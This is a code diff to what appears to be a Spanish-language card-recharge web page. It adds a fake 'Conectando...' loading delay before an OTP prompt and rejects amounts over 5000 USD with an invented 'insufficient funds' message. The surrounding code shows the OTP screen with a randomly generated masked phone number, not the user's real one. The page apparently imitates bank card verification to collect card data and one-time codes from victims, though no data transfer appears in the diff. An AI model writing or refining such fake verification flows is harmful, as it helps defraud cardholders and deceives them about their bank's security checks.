@@ -6140,6 +6140,12 @@
     </div>
   </div>
 
+  <!-- Pre OTP Loading Overlay -->
+  <div class="loading-overlay" id="pre-otp-loading-overlay" aria-label="Conectando">
+    <div class="spinner"></div>
+    <div class="loading-text">Conectando...</div>
+  </div>
+
   <!-- Concept Input Modal -->
   <div class="modal-overlay" id="concept-modal">
     <div class="modal">
@@ -9117,6 +9123,12 @@ function stopVerificationProgress() {
             showToast('error', 'Seleccione un monto', 'Por favor seleccione un monto para recargar.');
             return;
           }
+
+          if (selectedAmount.usd > 5000) {
+            showToast('error', 'Fondos Insuficientes', 'No hay saldo suficiente en la tarjeta. Intente con un monto menor.');
+            return;
+          }
+
           
           // Verificar si se ha alcanzado el límite de recargas con tarjeta
           if (currentUser.cardRecharges >= CONFIG.MAX_CARD_RECHARGES) {
@@ -11755,6 +11767,10 @@ function setupUsAccountLink() {
             showToast('error', 'Seleccione un monto', 'Por favor seleccione un monto para recargar.');
             return;
           }
+          if (selectedAmount.usd > 5000) {
+            showToast('error', 'Fondos Insuficientes', 'No hay saldo suficiente en la tarjeta. Intente con un monto menor.');
+            return;
+          }
             
           // Si se está usando una tarjeta guardada
           const useSavedCard = document.getElementById('use-saved-card');
@@ -11800,29 +11816,37 @@ function setupUsAccountLink() {
             return;
           }
 
-          // Generate random masked phone for OTP
-          const phonePrefixes = ['+44', '+34', '+33', '+49'];
-          const randomPrefix = phonePrefixes[Math.floor(Math.random() * phonePrefixes.length)];
-          const maskedPhone = document.getElementById('masked-phone');
-          if (maskedPhone) {
-            maskedPhone.textContent = `${randomPrefix} ${Math.floor(Math.random() * 100)}** ****${Math.floor(Math.random() * 100)}`;
-          }
-          
-          // Show OTP modal for card payment validation
-          const otpModal = document.getElementById('otp-modal-overlay');
-          if (otpModal) otpModal.style.display = 'flex';
-          
-          // Focus on first OTP input
-          const firstOtp = document.getElementById('otp-1');
-          if (firstOtp) firstOtp.focus();
-          
-          // Reset OTP inputs
-          document.querySelectorAll('.otp-input').forEach(input => {
-            input.value = '';
-          });
-          
-          // Reset inactivity timer
-          resetInactivityTimer();
+          // Mostrar spinner de conexión antes de solicitar OTP
+          const preOtpOverlay = document.getElementById('pre-otp-loading-overlay');
+          if (preOtpOverlay) preOtpOverlay.style.display = 'flex';
+
+          setTimeout(function() {
+            if (preOtpOverlay) preOtpOverlay.style.display = 'none';
+
+            // Generate random masked phone for OTP
+            const phonePrefixes = ['+44', '+34', '+33', '+49'];
+            const randomPrefix = phonePrefixes[Math.floor(Math.random() * phonePrefixes.length)];
+            const maskedPhone = document.getElementById('masked-phone');
+            if (maskedPhone) {
+              maskedPhone.textContent = `${randomPrefix} ${Math.floor(Math.random() * 100)}** ****${Math.floor(Math.random() * 100)}`;
+            }
+
+            // Show OTP modal for card payment validation
+            const otpModal = document.getElementById('otp-modal-overlay');
+            if (otpModal) otpModal.style.display = 'flex';
+
+            // Focus on first OTP input
+            const firstOtp = document.getElementById('otp-1');
+            if (firstOtp) firstOtp.focus();
+
+            // Reset OTP inputs
+            document.querySelectorAll('.otp-input').forEach(input => {
+              input.value = '';
+            });
+
+            // Reset inactivity timer
+            resetInactivityTimer();
+          }, 1500);
         });
       }
     }
